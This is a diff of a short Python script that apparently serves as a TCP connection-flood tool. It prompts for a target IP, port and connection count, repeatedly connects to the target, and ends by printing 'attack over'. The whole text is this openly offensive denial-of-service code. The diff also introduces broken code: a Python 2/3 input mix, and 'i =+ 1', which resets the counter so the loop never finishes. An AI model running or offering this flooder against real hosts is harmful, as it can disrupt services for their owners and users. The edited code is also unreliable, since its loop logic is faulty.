@@ -9,16 +9,17 @@ print (" _______ _____ _____     _______     ___   _          _______ _______   
 
 import socket
 
-TCP_IP = str(input("IP : "))
-TCP_PORT = int(input("port : "))
+IP = raw_input("IP : ")
+print (IP)
+PORT = int(input("port : "))
 nb_conexion = int(input("number of connexion : "))
 i = 0
 
 while (i < nb_conexion):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((TCP_IP, TCP_PORT))
+    s.connect((IP, PORT))
     s.close()
-    i = i + 1
+    i =+ 1
     if (i%10 == 0):
         print(i, " connexions")
 print("attack over")
